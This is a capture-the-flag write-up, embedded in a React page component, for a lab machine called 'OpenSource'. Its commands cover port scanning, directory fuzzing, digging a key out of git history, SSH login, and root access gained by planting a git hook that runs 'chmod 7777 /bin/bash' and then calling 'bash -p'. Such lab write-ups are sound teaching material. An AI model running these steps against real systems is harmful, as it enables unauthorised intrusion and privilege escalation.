...
const Post = () => (
  <Layout title="OpenSource Writeup">
    <Container>
      ...
      <P>
	First we ping the target IP to check the connection and then we nmap the target. I use nmap
	to perform a quick scan and export the info to a file called allPorts.
	I also recommend executing curl to extract the HTTP header and the current location.
	</P>
	<Code>nmap -p- --min-rate 5000 --open -vvv -n -Pn 10.10.11.164 -oG allPorts
	curl -IL 10.10.11.164
	</Code>
	...
	Let&apos;s see what we can find fuzzing the directories with gobuster:
	</P>
	<Code>gobuster dir -u http://10.10.11.164/ -w /your/path/to/wordlist.txt </Code>
	...
	<P>A /shell and /console. First doesn&apos;t work, second is pin protected. Subdomain fuzzing with gobuster  
	doesn&apos;t provide anything useful.
	</P>
	<Code>gobuster dns -d 10.10.11.164 -w /your/path/to/wordlist.txt</Code>
	<P>But... there is a git file in the code we downloaded! </P>
	<Code>git log --raw</Code>
	<P>shows us that there could be a useful commit, which we will inspect with
	<Code>git diff ee9d9f1ef9156c787d53074493e39ae364cd1e05:Dockerfile HEAD:Dockerfile</Code>
	...
	<P>If we now connect via ssh we access the machine and we can get the user flag:</P>
	<Code>ssh dev01@10.10.11.164 -i rsa-key</Code>
	...
	<P>In the gtfobins webpage we find that we can rewrite something in the /.git/hooks/ folder to execute something. We will create a file here that contains the following code so we can have a bash with full permissions: </P>
	<Code>chmod 7777 /bin/bash</Code>
	<P>With the command watch we can monitor when will root execute this file:</P>
	...
	<P>We now can execute bash in priviledge mode and have full access to root with:</P>
	<Code>bash -p</Code>
